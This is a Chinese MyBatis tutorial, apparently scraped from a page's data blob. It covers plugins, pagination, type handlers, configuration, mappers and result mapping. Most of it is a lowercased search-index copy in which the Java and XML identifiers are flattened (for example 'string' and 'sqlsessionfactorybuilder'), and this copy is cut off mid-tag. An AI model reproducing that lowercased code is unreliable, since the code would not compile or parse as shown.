我们可以为四大对象创建一个代理对象，AOP切面编程的思想。通过代理对象我们就能拦截到四大对象中执行的方法。\n\n\n# 编写插件\n\n 1. 实现interceptor接口\n 2. 实现相关方法\n 3. 使用@Interceptor实现插件签名\n 4. 将插件注册到mybatis配置文件中\n\npackage com.pwddd.mybatis.plugins;\n\nimport org.apache.ibatis.executor.statement.StatementHandler;\nimport org.apache.ibatis.plugin.*;\n\nimport java.util.Properties;\n\n@Intercepts(\n        @Signature(\n                type = StatementHandler.class,\n                method="parameterize",\n                args=java.sql.Statement.class\n        )\n)\npublic class MyFirstPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        return invocation.proceed();\n    }\n\n    @Override\n    public Object plugin(Object target) {\n        return Plugin.wrap(target,this);\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<plugins>\n    <plugin interceptor="com.pwddd.mybatis.plugins.MyFirstPlugin">\n        <property name="haha" value="123"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# 扩展\n\n\n# 分页\n\n分页插件地址：Mybatis-PageHelper-DOC\n\n 1. 引入依赖\n\n<dependency>\n    <groupId>com.github.pagehelper</groupId>\n    <artifactId>pagehelper</artifactId>\n    <version>5.3.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 引入插件\n\n\x3c!-- \n        plugins在配置文件中的位置必须符合要求，否则会报错，顺序如下:\n        properties?, settings?, \n        typeAliases?, typeHandlers?, \n        objectFactory?,objectWrapperFactory?, \n        plugins?, \n        environments?, databaseIdProvider?, mappers?\n    --\x3e\n<plugins>\n    \x3c!-- com.github.pagehelper为PageHelper类所在包名 --\x3e\n    <plugin interceptor="com.github.pagehelper.PageInterceptor">\n        \x3c!-- 使用下面的方式配置参数，后面会有所有的参数介绍 --\x3e\n        <property name="param1" value="value1"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n具体使用方法查看文档。\n\n\n# 批量操作\n\nSqlSession openSession = sqlSessionFactory.openSession(ExecutorType.BATCH);\n\n\n1\n\n\nspring整合时可以注入一个bean，然后autowired自动注入到dao层，使用该bean创建mapper代理类对象，进行查询。\n\n\n# 自定义类型处理器 Type Handler\n\n\npublic class MyEnumEmpStatusTypeHandler implements TypeHandler<EmpStatus> {\n\n\t/**\n\t * 定义当前数据如何保存到数据库中\n\t */\n\t@Override\n\tpublic void setParameter(PreparedStatement ps, int i, EmpStatus parameter,\n\t\t\tJdbcType jdbcType) throws SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tSystem.out.println("要保存的状态码："+parameter.getCode());\n\t\tps.setString(i, parameter.getCode().toString());\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(ResultSet rs, String columnName)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\t//需要根据从数据库中拿到的枚举的状态码返回一个枚举对象\n\t\tint code = rs.getInt(columnName);\n\t\tSystem.out.println("从数据库中获取的状态码："+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(ResultSet rs, int columnIndex)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tint code = rs.getInt(columnIndex);\n\t\tSystem.out.println("从数据库中获取的状态码："+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(CallableStatement cs, int columnIndex)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tint code = cs.getInt(columnIndex);\n\t\tSystem.out.println("从数据库中获取的状态码："+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n<typeHandlers>\n    \x3c!--1、配置我们自定义的TypeHandler  --\x3e\n    <typeHandler handler="com.atguigu.mybatis.typehandler.MyEnumEmpStatusTypeHandler" javaType="com.atguigu.mybatis.bean.EmpStatus"/>\n    \x3c!--2、也可以在处理某个字段的时候告诉MyBatis用什么类型处理器\n    保存：#{empStatus,typeHandler=xxxx}\n    查询：\n     <resultMap type="com.atguigu.mybatis.bean.Employee" id="MyEmp">\n       <id column="id" property="id"/>\n       <result column="empStatus" property="empStatus" typeHandler=""/>\n      </resultMap>\n    注意：如果在参数位置修改TypeHandler，应该保证保存数据和查询数据用的TypeHandler是一样的。\n    --\x3e\n</typeHandlers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',normalizedContent:'# mybatis\n\n\n# mybatis简介\n\nmybatis 是一款优秀的持久层框架，它支持自定义 sql、存储过程以及高级映射。mybatis 免除了几乎所有的 jdbc 代码以及设置参数和获取结果集的工作。mybatis 可以通过简单的 xml 或注解来配置和映射原始类型、接口和 java pojo（plain old java objects，普通老式 java 对象）为数据库中的记录。\n\n之前的数据库操作方式：原生jdbc-> jdbcutils -> jdbctemplates -> mybatis\n\n\n\n\n\n\n# mybatisdemo项目\n\n\n# 老方法\n\n 0. 创建测试数据库，并创建测试表\n\ncreate table tbl_employee(\nid int(11) primary key auto_increment,\nlast_name varchar(200),\ngender char(1),\nemail varchar(200)\n\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 1. 建立maven项目，引入mybatis相关依赖\n\n要使用 mybatis， 只需将 mybatis-x.x.x.jar 文件置于类路径（classpath）中即可。\n\n如果使用 maven 来构建项目，则需将下面的依赖代码置于 pom.xml 文件中：\n\n<dependencies>  \n     <dependency>  \n <groupid>org.mybatis</groupid>  \n <artifactid>mybatis</artifactid>  \n <version>3.5.9</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --\x3e  \n <dependency>  \n <groupid>mysql</groupid>  \n <artifactid>mysql-connector-java</artifactid>  \n <version>8.0.22</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\x3e  \n <dependency>  \n <groupid>org.apache.logging.log4j</groupid>  \n <artifactid>log4j-core</artifactid>  \n <version>2.17.1</version>  \n </dependency>  \n  \n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 配置日志打印\n\n<settings>  \n <setting name="logimpl" value="stdout_logging" />  \n</settings>\n\n\n1\n2\n3\n\n 3. 创建mybatis-config.xml配置文件，配置数据源\n\n<?xml version="1.0" encoding="utf-8" ?>  \n<!doctype configuration  \n public "-//mybatis.org//dtd config 3.0//en"  \n "http://mybatis.org/dtd/mybatis-3-config.dtd">  \n<configuration>  \n <environments default="development">  \n <environment id="development">  \n <transactionmanager type="jdbc"/>  \n <datasource type="pooled">  \n <property name="driver" value="com.mysql.jdbc.driver"/>  \n <property name="url" value="jdbc:mysql://localhost:3306/testmybatis"/>  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n </datasource>  \n </environment>  \n </environments>  \n <mappers>  \n     \x3c!--映射文件位于classpath下 --\x3e\n <mapper resource="employeemapper.xml"></mapper>  \n </mappers>  \n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 4. 从 xml 中构建 sqlsessionfactory\n\n每个基于 mybatis 的应用都是以一个 sqlsessionfactory 的实例为核心的。sqlsessionfactory 的实例可以通过 sqlsessionfactorybuilder 获得。而 sqlsessionfactorybuilder 则可以从 xml 配置文件或一个预先配置的 configuration 实例来构建出 sqlsessionfactory 实例。\n\n从 xml 文件中构建 sqlsessionfactory 的实例非常简单，建议使用类路径下的资源文件进行配置。 但也可以使用任意的输入流（inputstream）实例，比如用文件路径字符串或 file:// url 构造的输入流。mybatis 包含一个名叫 resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。\n\npublic static void main(string[] args) throws ioexception {  \n string resource = "mybatis-config.xml";  \n inputstream resourceasstream = resources.getresourceasstream(resource);  \n sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);  \n sqlsession sqlsession = sqlsessionfactory.opensession();  \n system.out.println(sqlsession);  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. 创建实体类\n\npackage com.pwddd.mybatis3.entity;  \n  \npublic class employee {  \n private int id;  \n private string lastname;  \n private int gender;  \n private string email;  \n  \n public int getid() {  \n return id;  \n }  \n  \n public void setid(int id) {  \n this.id = id;  \n }  \n  \n public string getlastname() {  \n return lastname;  \n }  \n  \n public void setlastname(string lastname) {  \n this.lastname = lastname;  \n }  \n  \n public int getgender() {  \n return gender;  \n }  \n  \n public void setgender(int gender) {  \n this.gender = gender;  \n }  \n  \n public string getemail() {  \n return email;  \n }  \n  \n public void setemail(string email) {  \n this.email = email;  \n }  \n  \n @override  \n public string tostring() {  \n return "employee{" +  \n "id=" + id +  \n ", lastname=\'" + lastname + \'\\\'\' +  \n ", gender=" + gender +  \n ", email=\'" + email + \'\\\'\' +  \n \'}\';  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 6. 创建映射sql语句\n\n<?xml version="1.0" encoding="utf-8" ?>  \n<!doctype mapper  \n public "-//mybatis.org//dtd mapper 3.0//en"  \n "http://mybatis.org/dtd/mybatis-3-mapper.dtd">  \n\x3c!--名称空间和查询中的名称空间一致--\x3e\n<mapper namespace="com.pwddd.mybatis3.employeemapper">  \n \x3c!--  \n namespace:名称空间;指定为接口的全类名  \n id：唯一标识  \n resulttype：返回值类型  \n #{id}：从传递过来的参数中取出id值  \n  \n public employee getempbyid(integer id); --\x3e <select id="getempbyid" resulttype="com.pwddd.mybatis3.entity.employee"> \n   \n select id,last_name,email,gender from tbl_employee where id = #{id}  \n </select>  \n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 7. 创建查询\n\npublic static void main(string[] args) {  \n string resource = "mybatis-config.xml";  \n inputstream resourceasstream = null;  \n sqlsession sqlsession = null;  \n try {  \n resourceasstream = resources.getresourceasstream(resource);  \n sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);  \n sqlsession = sqlsessionfactory.opensession();  \n  \n employee employee = sqlsession.selectone("com.pwddd.mybatis3.employeemapper.getempbyid", 1);  \n system.out.println(employee);  \n } catch (ioexception e) {  \n e.printstacktrace();  \n } finally {  \n sqlsession.close();  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口式编程方式\n\n 1. 创建接口\n\npackage com.pwddd.mybatis3.dao;  \n  \nimport com.pwddd.mybatis3.entity.employee;  \n  \npublic interface employeemapper {  \n employee getempbyid(integer id);  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. namespace配置接口全类名\n\n<mapper namespace="com.pwddd.mybatis3.dao.employeemapper">\n\n\n1\n\n 3. mapper.xml中查询方法名和接口中定义的方法名一致\n\n<select id="getempbyid" resulttype="com.pwddd.mybatis3.entity.employee">  \n select id,last_name as lastname,email,gender from tbl_employee where id = #{id}  \n</select>\n\n\n1\n2\n3\n\n 4. 编写测试方法\n\n@test\npublic void testinterface() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    employeemapper mapper = sqlsession.getmapper(employeemapper.class);\n    employee emp = mapper.getempbyid(1);\n    system.out.println(emp);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# mybatis配置文件\n\n\n# properties 标签\n\n在mybatis配置文件中的一些属性（如数据库链接的相关信息）可以配置在外部的配置文件中，通过properties标签将外部的配置文件引入，然后使用${}将配置导入到mybatis配置文件中。具体的用法如下面所示：\n\n<properties resource="jdbc.properties" />\n\n\n1\n\n\n除此之外，还可以在properties 标签内设置相关属性的值，但是这样不会替换掉外部配置文件中设置的值，只是增加值：\n\n<properties resource="jdbc.properties">  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n</properties>\n\n\n1\n2\n3\n4\n\n\n除此之外，还可以在创建sqlsessionfactory时将配置文件传入：\n\n@test\npublic void testresource() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    properties properties = new properties();\n    properties.load(new fileinputstream(new file("src/main/resources/jdbc.properties")));\n    sqlsessionfactory build = new sqlsessionfactorybuilder().build(resourceasstream, properties);\n    sqlsession sqlsession = build.opensession();\n    system.out.println(sqlsession);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n从mybatis 3.4.2版本开始，可以为属性设置一个默认值，如果获取不到值则使用默认值，但是默认值的属性没有开启，并且默认的分隔符是：，可以使用如下的配置进行设置和使用。修改默认的分隔符的目的是如果属性名中含有其他的冒号则容易冲突，如果不含，那么可以正常使用默认值：\n\n<property name="org.apache.ibatis.parsing.propertyparser.enable-default-value" value="true"/>  \n<property name="org.apache.ibatis.parsing.propertyparser.default-value-separator" value="?:"/>\n\n<property name="username" value="${mysql.username?:root}"/>\n\n\n1\n2\n3\n4\n\n\n\n# settings 标签\n\n这是 mybatis 中极为重要的调整设置，它们会改变 mybatis 的运行时行为。用来对mybatis进行一些设置的配置。\n\n常用的配置内容和功能如下：\n\n#todo\n\n\n\n开启驼峰命名：\n\n<setting name="mapunderscoretocamelcase" value="true"/>\n\n\n1\n\n\n数据库对于null值的匹配处理\n\n<setting name="jdbctypefornull" value="null"/>\n\n\n1\n\n\n开启分步查询懒加载：\n\n<setting name="lazyloadingenabled" value="true"/>\n\x3c!--        按照需要进行属性的加载--\x3e\n<setting name="aggressivelazyloading" value="false"/>\n\n\n1\n2\n3\n\n\n\n# typealiases 别名处理器\n\n用于给类型起别名，仅用于 xml 配置，意在降低冗余的全限定类名书写。在通常情况下，我们在mapper中配置的resulttype通常为类的全类名，这种方法过于冗余，可以使用别名的方式，以后配置就可以用别名代替全类名了。\n\n<typealiases>\n    <typealias type="com.pwddd.mybatis.bean.employee" alias="emp" />\n</typealiases>\n\n\n1\n2\n3\n\n\n除此之外，还可以配置批量包下面的别名，如下配置中的包下的所有类都会有一个首字母小写的别名：\n\n<typealiases> \n\t<package name="domain.blog"/> \n</typealiases>\n\n\n1\n2\n3\n\n\n还可以使用注解的方式，为类起别名，但是前提是配置包的别名：\n\n<typealiases>  \n    <package name="com.pwddd.hello.entity"/>  \n    \x3c!--        <typealias type="com.pwddd.hello.entity.employee" alias="employee" />--\x3e  \n</typealiases>\n\n\n1\n2\n3\n4\n\n\n@alias("emp")  \npublic class employee {\n\n\n1\n2\n\n\n\n# typehandlers\n\nmybatis 在设置预处理语句（preparedstatement）中的参数或从结果集中取出一个值时， 都会用类型处理器将获取到的值以合适的方式转换成 java 类型。从 3.4.5 开始，mybatis 默认支持 jsr-310（日期和时间 api）。\n\n\n# plugins\n\nmybatis 允许你在映射语句执行过程中的某一点进行拦截调用。默认情况下，mybatis 允许使用插件来拦截的方法调用包括：\n\n * executor (update, query, flushstatements, commit, rollback, gettransaction, close, isclosed)\n * parameterhandler (getparameterobject, setparameters)\n * resultsethandler (handleresultsets, handleoutputparameters)\n * statementhandler (prepare, parameterize, batch, update, query)\n\n\n# environments\n\nmybaits为了更好的适应多种数据库的连接需要，并且方便多个数据库之间的切换使用，使用environments对数据库进行配置。environments标签有一个default属性用于指定当前使用的环境。在environments标签下又有environment标签，用于配置多个数据库环境。\n\n<environments default="mysql">  \n <environment id="mysql">  \n <transactionmanager type="jdbc" />  \n <datasource type="pooled">  \n <property name="driver" value="${mysql.driver}"/>  \n <property name="url" value="${mysql.url}"/>  \n <property name="username" value="${username?:root}"/>  \n <property name="password" value="${mysql.password}"/>  \n </datasource>  \n </environment>  \n</environments>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# transactionmanager\n\n在 mybatis 中有两种类型的事务管理器（也就是 type="[jdbc|managed]"）：\n\n * jdbc – 这个配置直接使用了 jdbc 的提交和回滚设施，它依赖从数据源获得的连接来管理事务作用域。\n * managed – 这个配置几乎没做什么。它从不提交或回滚一个连接，而是让容器来管理事务的整个生命周期（比如 jee 应用服务器的上下文）。 默认情况下它会关闭连接。\n\n但是如果使用的spring+mybatis，则可以将事务处理交给spring来做。\n\n# datasource\n\nmybatis有三大内建的数据源：\n\n * unpooled：这个数据源的实现会每次请求时打开和关闭连接。\n * pooled：这种数据源的实现利用“池”的概念将 jdbc 连接对象组织起来，避免了创建新的连接实例时所必需的初始化和认证时间。 这种处理方式很流行，能使并发 web 应用快速响应请求。\n * jndi：这个数据源实现是为了能在如 ejb 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置一个 jndi 上下文的数据源引用。\n\n除此之外还可以自定义数据源，type为自定义数据源的全类名。\n\n\n# databaseidprovider\n\nmybatis为不同的数据库设置了不同的数据库的标识。这种多厂商的支持是基于映射语句中的 databaseid 属性。 mybatis 会加载带有匹配当前数据库 databaseid 属性和所有不带 databaseid 属性的语句。这种多厂商的支持是基于映射语句中的 databaseid 属性。 mybatis 会加载带有匹配当前数据库 databaseid 属性和所有不带 databaseid 属性的语句。只需要为不同的sql语句配置数据库标签（databaseid）即可。\n\n<databaseidprovider type="db_vendor">  \n <property name="sql server" value="sqlserver"/>  \n <property name="db2" value="db2"/>  \n <property name="oracle" value="oracle" />  \n</databaseidprovider>\n\n\n1\n2\n3\n4\n5\n\n\n\n# mappers\n\n我们需要告诉mabatis去哪里寻找我们的mapper配置文件。你可以使用相对于类路径的资源引用，或完全限定资源定位符（包括 file:/// 形式的 url），或类名和包名等。例如：\n\n\n\x3c!-- 使用相对于类路径的资源引用 --\x3e  \n<mappers>  \n <mapper resource="org/mybatis/builder/authormapper.xml"/>  \n <mapper resource="org/mybatis/builder/blogmapper.xml"/>  \n <mapper resource="org/mybatis/builder/postmapper.xml"/>  \n</mappers>  \n\x3c!-- 使用完全限定资源定位符（url） --\x3e  \n<mappers>  \n <mapper url="file:///var/mappers/authormapper.xml"/>  \n <mapper url="file:///var/mappers/blogmapper.xml"/>  \n <mapper url="file:///var/mappers/postmapper.xml"/>  \n</mappers>  \n\x3c!-- 使用映射器接口实现类的完全限定类名 --\x3e  \n<mappers>  \n <mapper class="org.mybatis.builder.authormapper"/>  \n <mapper class="org.mybatis.builder.blogmapper"/>  \n <mapper class="org.mybatis.builder.postmapper"/>  \n</mappers>  \n\x3c!-- 将包内的映射器接口实现全部注册为映射器 --\x3e  \n<mappers>  \n <package name="org.mybatis.builder"/>  \n</mappers>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中，使用映射器接口实现类的完全限定类名进行注册时，可以使用注解的方式进行配置。\n\n\t@select("select * from tbl_employee where id=#{id}")\n\tpublic employee getempbyid(integer id);\n\n\n1\n2\n\n\n这种方式虽然便捷，但是对于复杂的sql语句不是很友好，因此复杂的语句建议还是在mapper配置文件中编写。\n\n\n# mapper映射文件\n\nsql 映射文件只有很少的几个顶级元素（按照应被定义的顺序列出）：\n\n * cache – 该命名空间的缓存配置。\n * cache-ref – 引用其它命名空间的缓存配置。\n * resultmap – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素。\n * parametermap – 老式风格的参数映射。此元素已被废弃，并可能在将来被移除！请使用行内参数映射。文档中不会介绍此元素。\n * sql – 可被其它语句引用的可重用语句块。\n * insert – 映射插入语句。\n * update – 映射更新语句。\n * delete – 映射删除语句。\n * select – 映射查询语句。\n\n\n# 增删改查\n\nmapper映射文件：\n\n<select id="getempbyid" resulttype="employee">\n        select * from tbl_employee where id = #{id}\n    </select>\n\n    <insert id="addemp" >\n        insert into tbl_employee(last_name,gender,email) values (#{lastname},#{gender},#{email})\n    </insert>\n\n    <update id="updateemp" >\n        update tbl_employee\n            set last_name = #{lastname},\n             gender = #{gender},\n             email = #{email}\n        where id = #{id};\n    </update>\n\n    <delete id="deleteemp" >\n        delete\n        from tbl_employee\n        where id=#{id};\n    </delete>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n对应接口：\n\nemployee getempbyid(integer id);\ninteger addemp(employee employee);\ninteger updateemp(employee employee);\ninteger deleteemp(integer id);\n\n\n1\n2\n3\n4\n\n\n测试：\n\n@test\npublic void testcrud() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    employeemapper employeemapper = sqlsession.getmapper(employeemapper.class);\n    system.out.println(employeemapper.deleteemp(2));\n    system.out.println(employeemapper.addemp(new employee(4, "zhangsan", 1, "123@qq.com")));\n    system.out.println(employeemapper.updateemp(new employee(1, "wangwu", 1, "wangwu@qq.com")));\n    sqlsession.commit();  // 由于mybatis默认关闭了自动提交功能 因此需要手动提交执行才会影响数据库\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 传入参数处理\n\n 1. 传递单个参数：#{任意} mybatis不做处理\n 2. 多个参数：\n    * sql中使用#{参数名}和接口名中传递的参数同名，这种方式会出错，多个参数会被封装成map，#{}从map中取值，可以使用param1,param2或者0，1直接取值。\n    * 命名参数：使用注解改变将封装map的key，@param("id")，直接使用#{id}取值\n 3. 如果多个参数，使用pojo对象，#{}传递pojo对象属性\n 4. 直接传入map，#{key}传递map对象对应的key值。\n 5. 经常要使用的多个参数，可以封装成to对象。\n 6. 如果传递的是collection(set list)、数组，也会进行特殊封装到map中，list使用#{list[0]}，数组使用#{array[0]}\n\n\n\n\n# 查询结果返回\n\n * 如果返回的是一个集合，则resulttype返回集合的泛型。\n\n    <select id="selectallemp" resulttype="employee">\n        select * from tbl_employee\n    </select>\n\n\n1\n2\n3\n\n * 如果返回一个map，key是列名，value是值的内容，resulttype则是map。\n\n    <select id="selectbyid" resulttype="map">\n        select * from tbl_employee where id=#{id}\n    </select>\n\n\n1\n2\n3\n\n * 如果返回一个map，key是主键，value是所有的查询结果。resulttype是map中封装的类型，并给方法加上@mapkey注解，指明主键。\n\n<select id="selectall" resulttype="employee">\nselect * from tbl_employee\n</select>\n\n\n1\n2\n3\n\n\n    @mapkey("id")\n    map<integer,employee> selectall();\n\n\n1\n2\n\n\n\n# 封装返回结果\n\n当数据库列名和我们定义的javabean属性名不一致时，使用resulttype指定返回值类型将会导致查出来的数据无法注入到结果中。有三种解决方式：\n\n * 如果数据库中的列名和javabean属性名满足驼峰命名法的转换，则在mybatis配置文件中开启驼峰命名法转换即可\n * 查询数据库语句起别名\n * 使用resultmap封装返回结果\n\n<resultmap id="emp" type="com.pwddd.mybatis.bean.employee">\n    <id property="id" column="id" />\n    <result property="lastname" column="last_name" />\n    <result property="gender" column="gender" />\n    <result property="email" column="email" />\n</resultmap>\n<select id="selectbyid" resultmap="emp">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 联合查询的结果返回\n\n# 方式一：使用级联赋值方式\n\n<resultmap id="empanddept" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <result column="did" property="dept.did" />\n    <result column="dname" property="dept.dname" />\n</resultmap>\n\n<select id="selectempanddeptbyid" resultmap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 方式二：使用association赋值\n\n<resultmap id="empanddept" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    \x3c!--        <result column="did" property="dept.did" />--\x3e\n    \x3c!--        <result column="dname" property="dept.dname" />--\x3e\n    <association property="dept" javatype="com.pwddd.mybatis.bean.dept">\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultmap>\n\n<select id="selectempanddeptbyid" resultmap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 方式三：分步查询\n\n 1. 按照员工id查出员工信息\n 2. 根据查询的员工信息中的did 查询对应的dept信息\n 3. 将部门设置到dept属性中\n\n<resultmap id="step" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <association property="dept" select="com.pwddd.mybatis.mapper.deptmapper.selectbyid" column="did" >\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultmap>\n<select id="getempbyidstep" resultmap="step">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 基于分步查询的延迟加载功能\n\nmybatis配置文件中增加开启懒加载配置：\n\n<setting name="lazyloadingenabled" value="true"/>\n\x3c!--        按照需要进行属性的加载--\x3e\n<setting name="aggressivelazyloading" value="false"/>\n\n\n1\n2\n3\n\n\n只使用employee中的字段时，就只查询一条sql语句\n\n@test\npublic void teststep() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    employeemapperplus mapper1 = sqlsessionfactory.opensession().getmapper(employeemapperplus.class);\n    employee empbyidstep = mapper1.getempbyidstep(1);\n    system.out.println(empbyidstep.getemail());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n[2022-02-20 20:23:29:798-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:23:29:799-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:23:29:841-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nwangwu@qq.com\n\n\n1\n2\n3\n4\n\n\n当时用到dept中查询的字段时再加载第二条sql语句\n\n@test\npublic void teststep() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    employeemapperplus mapper1 = sqlsessionfactory.opensession().getmapper(employeemapperplus.class);\n    employee empbyidstep = mapper1.getempbyidstep(1);\n    system.out.println(empbyidstep.getemail());\n    system.out.println("============================================");\n    system.out.println(empbyidstep.getdept().getdid());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n[2022-02-20 20:26:02:673-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:26:02:702-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:26:02:748-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nwangwu@qq.com\n============================================\n[2022-02-20 20:26:02:748-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_dept where did = ?\n[2022-02-20 20:26:02:749-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:26:02:751-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\n1\n\nprocess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 联合查询的集合结果返回\n\n一个部门有多个员工，查询部门时，返回部门下的所有员工。\n\n# 方式一：多表联合查询\n\n<resultmap id="depts" type="com.pwddd.mybatis.bean.dept" >\n    <id column="did" property="did" 